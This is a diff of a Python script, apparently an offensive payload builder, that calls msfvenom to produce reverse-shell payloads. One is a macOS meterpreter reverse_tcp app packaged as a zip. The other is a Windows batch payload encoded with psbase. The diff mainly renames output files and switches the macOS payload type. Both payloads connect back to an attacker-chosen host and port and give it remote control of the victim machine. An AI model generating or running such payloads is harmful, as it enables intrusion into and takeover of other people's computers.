@@ -10,10 +10,10 @@ def menu():
 
 def payloadGenerator(mode):        
     if mode == "1":
-	    host = input("──────╼┤HOST├─> ")
-	    port = input("──────╼┤PORT├─> ")
+	    host = input("─────────╼┤HOST├─> ")
+	    port = input("─────────╼┤PORT├─> ")
 	    print("\n")
-	    command = "sudo msfvenom -p osx/x86/shell_reverse_tcp LHOST="+host+" LPORT="+port+" -a x86 --platform osx -f osx-app -o shadowpayload.dylib"
+	    command = "sudo msfvenom -p osx/meterpreter/reverse_tcp_uuid LHOST="+host+" LPORT="+port+" -f osx-app -o shadowpacked.zip"
 	    os.system(command)
         
     elif mode == "2":
@@ -21,7 +21,7 @@ def payloadGenerator(mode):
         os.system("ls templates")
         template = input("\n─╼┤SELECTION├─> ")
         print("\n")
-        command = "sudo msfvenom -p generic/custom PAYLOADFILE=templates/"+template+" -a x86 --platform win -e psbase NOEXIT SYSWOW64 -o shadowpayload.bat"
+        command = "sudo msfvenom -p generic/custom PAYLOADFILE=templates/"+template+" -a x86 --platform win -e psbase NOEXIT SYSWOW64 -o shadowpower.bat"
         os.system(command)
         
     print("\n")
